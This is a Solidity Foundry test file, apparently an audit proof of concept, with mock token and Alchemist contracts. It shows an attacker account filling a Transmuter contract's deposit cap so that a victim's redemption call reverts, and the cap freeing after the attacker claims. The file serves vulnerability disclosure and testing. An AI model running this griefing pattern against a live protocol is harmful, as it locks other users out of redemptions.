// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/Transmuter.sol";
import "../src/interfaces/ITransmuter.sol";
import "../src/interfaces/IAlchemistV3.sol";

/// ─────────────────────────────────────────────
/// Mock minimal ERC20
/// ─────────────────────────────────────────────
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insuf");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != from) {
            uint256 allowed = allowance[from][msg.sender];
            require(allowed >= amount, "allow insuf");
            allowance[from][msg.sender] = allowed - amount;
        }
        require(balanceOf[from] >= amount, "bal insuf");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function burn(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "burn insuf");
        balanceOf[msg.sender] -= amount;
    }
}

/// ─────────────────────────────────────────────
/// MockAlchemist — minimal implementación para Transmuter
/// ─────────────────────────────────────────────
contract MockAlchemist is IAlchemistV3 {
    MockERC20 public yieldToken;
    MockERC20 public underlying;
    uint256 public syntheticsIssued;

    constructor(MockERC20 _yield, MockERC20 _underlying) {
        yieldToken = _yield;
        underlying = _underlying;
        syntheticsIssued = 1e30;
    }

    function totalSyntheticsIssued() external view override returns (uint256) {
        return syntheticsIssued;
    }

    function getTotalUnderlyingValue() external view override returns (uint256) {
        return 1e30;
    }

    function convertYieldTokensToUnderlying(uint256 amount) external view override returns (uint256) {
        return amount;
    }

    function redeem(uint256 amount) external override {
        yieldToken.mint(msg.sender, amount);
    }

    function reduceSyntheticsIssued(uint256 amount) external override {
        if (syntheticsIssued >= amount) syntheticsIssued -= amount;
        else syntheticsIssued = 0;
    }

    function setTransmuterTokenBalance(uint256) external override {}

    function myt() external view override returns (address) {
        return address(yieldToken);
    }

    function underlyingToken() external view override returns (address) {
        return address(underlying);
    }

    fallback() external payable {}
    receive() external payable {}
}

/// ─────────────────────────────────────────────
/// Test principal: demuestra el DoS / griefing
/// ─────────────────────────────────────────────
contract TransmuterGriefingTest is Test {
    Transmuter public transmuter;
    MockERC20 public synthetic;
    MockERC20 public yieldToken;
    MockERC20 public underlying;
    MockAlchemist public alchemist;

    address public attacker = address(0xA11);
    address public victim = address(0xBEEF);
    address public feeReceiver = address(0xFEE);

    function setUp() public {
        synthetic = new MockERC20("Synth", "SYN");
        yieldToken = new MockERC20("Yield", "YLD");
        underlying = new MockERC20("Underlying", "UND");
        alchemist = new MockAlchemist(yieldToken, underlying);

        ITransmuter.TransmuterInitializationParams memory params =
            ITransmuter.TransmuterInitializationParams({
                syntheticToken: address(synthetic),
                timeToTransmute: 100,
                transmutationFee: 50,
                exitFee: 10,
                feeReceiver: feeReceiver
            });

        transmuter = new Transmuter(params);
        transmuter.setAlchemist(address(alchemist));
        transmuter.setDepositCap(10e18);

        synthetic.mint(attacker, 20e18);
        synthetic.mint(victim, 1e18);

        vm.startPrank(attacker);
        synthetic.approve(address(transmuter), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        synthetic.approve(address(transmuter), type(uint256).max);
        vm.stopPrank();
    }

    /// El atacante llena el cupo y bloquea a otros usuarios
    function test_griefing_blocks_victim() public {
        uint256 fill = transmuter.depositCap() - transmuter.totalLocked();
        vm.prank(attacker);
        transmuter.createRedemption(fill);

        assertEq(transmuter.totalLocked(), transmuter.depositCap());

        vm.prank(victim);
        vm.expectRevert(abi.encodePacked(bytes4(keccak256("DepositCapReached()"))));
        transmuter.createRedemption(1e18);
    }

    /// Si el atacante reclama, se libera el cupo
    function test_attacker_claim_allows_victim() public {
        uint256 fill = transmuter.depositCap() - transmuter.totalLocked();
        vm.prank(attacker);
        transmuter.createRedemption(fill);

        vm.roll(block.number + 1);

        vm.prank(attacker);
        transmuter.claimRedemption(1);

        assertEq(transmuter.totalLocked(), 0);

        vm.prank(victim);
        transmuter.createRedemption(1e18);

        assertEq(transmuter.totalLocked(), 1e18);
    }
}
